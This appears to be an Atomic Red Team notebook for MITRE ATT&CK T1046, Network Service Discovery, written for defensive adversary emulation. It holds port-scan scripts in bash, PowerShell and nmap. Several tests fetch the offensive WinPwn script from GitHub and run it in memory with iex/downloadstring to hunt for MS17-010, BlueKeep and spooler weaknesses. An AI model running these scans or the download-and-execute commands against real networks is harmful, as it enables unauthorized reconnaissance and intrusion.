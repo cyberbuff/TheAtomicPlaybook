{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "86b1efd2",
   "metadata": {},
   "source": "# T1046 - Network Service Discovery\nAdversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)"
  },
  {
   "cell_type": "markdown",
   "id": "a0452595",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "2593ac7f",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Port Scan",
    "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nfor port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c998ebcf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "e141d536",
   "metadata": {},
   "source": "### Atomic Test #2 - Port Scan Nmap\nScan ports to check for listening ports with Nmap.\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n\n**Supported Platforms:** linux, macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if nmap command exists on the machine\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v nmap)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)\n\n```\n##### Description: Check if nc command exists on the machine\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v nc)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)\n\n```\n##### Description: Check if telnet command exists on the machine\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v telnet)\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\n(which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bce3ecb3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fe050883",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo nmap -sS 192.168.1.0/24 -p 80\ntelnet 192.168.1.1 80\nnc -nv 192.168.1.1 80\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e344d469",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ec8e7b95",
   "metadata": {},
   "source": "### Atomic Test #3 - Port Scan NMap for Windows\nScan ports to check for listening ports for the local host 127.0.0.1\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: NMap must be installed\n\n##### Check Prereq Commands:\n```powershell\nif (cmd /c \"nmap 2>nul\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" https://nmap.org/dist/nmap-7.80-setup.exe\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\nmap-7.80-setup.exe\" /S\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6636005",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fcca8182",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nnmap 127.0.0.1```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0248295d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "ee62e940",
   "metadata": {},
   "source": "### Atomic Test #4 - Port Scan using python\nScan ports to check for listening ports with python\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Check if python exists on the machine\n\n##### Check Prereq Commands:\n```powershell\nif (python --version) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\necho \"Python 3 must be installed manually\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "53e3f9a3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "73b6cf2e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\npython \"PathToAtomicsFolder\\T1046\\src\\T1046.py\" -i 127.0.0.1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28c1cd83",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "db6d79de",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - WinPwn - spoolvulnscan",
    "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e71f01c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "95d3e320",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - WinPwn - MS17-10",
    "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f521d52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "a9b377a0",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - bluekeep",
    "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fcdd812",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "4792cb28",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - WinPwn - fruit",
    "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf495dac",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "43fed7e4",
   "metadata": {},
   "source": "### Atomic Test #9 - Network Service Discovery for Containers\nAttackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.\n**Supported Platforms:** containers\n#### Dependencies:  Run with `sh`!\n##### Description: Verify docker is installed.\n##### Check Prereq Commands:\n```sh\nwhich docker\n\n```\n##### Get Prereq Commands:\n```sh\nif [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n\n```\n##### Description: Verify docker service is running.\n##### Check Prereq Commands:\n```sh\nsudo systemctl status docker  --no-pager\n\n```\n##### Get Prereq Commands:\n```sh\nsudo systemctl start docker\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f871189a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c9119ca0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ndocker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/\ndocker run --name t1046_container  -d -t t1046\ndocker exec t1046_container ./test.sh```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a088cc1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "483ec1af",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\ndocker stop t1046_container\ndocker rmi -f t1046```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "03bf9a7f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "507745e6",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Port-Scanning /24 Subnet with PowerShell",
    "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$ipAddr = \"\"\nif ($ipAddr -eq \"\") {\n    # Assumes the \"primary\" interface is shown at the top\n    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n    Write-Host \"[i] Using Interface $interface\"\n    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n}\nWrite-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n# Always assumes /24 subnet\nWrite-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n$ports = 445, 3389\n$subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\nforeach ($ip in $subnetIPs) {\n    foreach ($port in $ports) {\n      try {\n          $tcp = New-Object Net.Sockets.TcpClient\n          $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null\n      } catch {}\n      if ($tcp.Connected) {\n          $tcp.Close()\n          Write-Host \"Port $port is open on $ip\"\n      }\n    }\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2da29ff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1046 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "8989d3e1",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans."
  },
  {
   "cell_type": "markdown",
   "id": "b33ffa76",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nThere is an opportunity for the defender to observe the adversary and control what they can see, what effects they can have, and/or what data they can access.\n#### Use Case\nA defender can change the output of a recon commands to hide simulation elements you don\u2019t want attacked and present simulation elements you want the adversary to engage with.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}